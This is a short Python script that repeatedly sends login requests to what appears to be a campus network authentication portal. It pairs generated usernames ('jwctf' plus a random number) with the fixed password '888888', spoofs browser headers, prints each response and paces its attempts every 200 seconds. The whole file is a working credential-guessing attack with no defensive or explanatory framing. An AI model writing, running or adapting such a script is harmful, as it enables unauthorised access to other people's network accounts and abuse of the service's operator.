#!/usr/bin/env python
import requests
import random
import time

url = 'http://10.0.0.55/include/auth_action.php'
headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Referer': 'http://10.0.0.55:803/srun_portal_pc.php?ac_id=1&',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'zh-CN,zh;q=0.8'
}

def login(data):
	hh = requests.session()
	hh1 = hh.post(url=url,data=data,headers=headers)
	return hh1.text
def intruder(username,passwd):
	form_data = {
	'action':'login',
	'username' : 'jwc92',
	'password' : passwd,
	'ac_id':'1',
	'save_me':'0',
	'ajax':'1'
	}
	form_data['username'] = username
	result = login(form_data)
	print(result)

while 1:
	username='jwctf'
	passwd = '888888'
	x=random.randrange(1,250)
	username+=str(x)
	intruder(username,passwd)
	time.sleep(200)

